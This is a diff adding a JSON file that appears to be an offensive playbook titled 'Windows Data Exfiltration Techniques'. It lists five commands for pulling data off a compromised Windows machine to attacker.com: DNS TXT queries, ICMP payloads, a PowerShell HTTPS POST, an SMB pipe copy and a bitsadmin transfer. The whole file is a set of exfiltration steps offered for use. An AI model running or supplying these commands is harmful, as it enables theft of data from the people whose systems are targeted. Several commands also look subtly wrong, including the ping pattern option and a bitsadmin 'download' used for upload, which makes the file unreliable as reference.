@@ -1,0 +1,37 @@
+{
+	"name": "Windows Data Exfiltration Techniques",
+	"description": "Multiple covert channels to extract data from compromised Windows systems.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "DNS TXT Records",
+			"command": "for /f %i in (secrets.txt) do nslookup -q=txt %i.attacker.com",
+			"description": "Encode data in DNS queries; receive via authoritative server logs."
+		},
+		{
+			"index": 2,
+			"name": "ICMP Echo (Ping)",
+			"command": "powershell -c \"(Get-Content data.txt -Raw) -split '(.{1000})' | % { ping -n 1 -p ([byte[]][char[]]$_) attacker.com }\"",
+			"description": "Embed payload in ICMP data field."
+		},
+		{
+			"index": 3,
+			"name": "HTTPS POST Beacon",
+			"command": "powershell -c \"IWR -Uri https://attacker.com/collect -Method POST -Body (Get-Content file.db -Raw) -ContentType 'application/octet-stream'\"",
+			"description": "Direct upload over TLS."
+		},
+		{
+			"index": 4,
+			"name": "SMB over Named Pipes",
+			"command": "copy sensitive.docx \\\\ATTACKER\\pipe\\spoolss",
+			"description": "Write to attacker-controlled SMB pipe."
+		},
+		{
+			"index": 5,
+			"name": "BITSAdmin Transfer",
+			"command": "bitsadmin /transfer exfilJob /download /priority normal http://attacker.com/upload C:\\temp\\data.zip C:\\temp\\null",
+			"description": "Abuse Background Intelligent Transfer Service."
+		}
+	]
+}
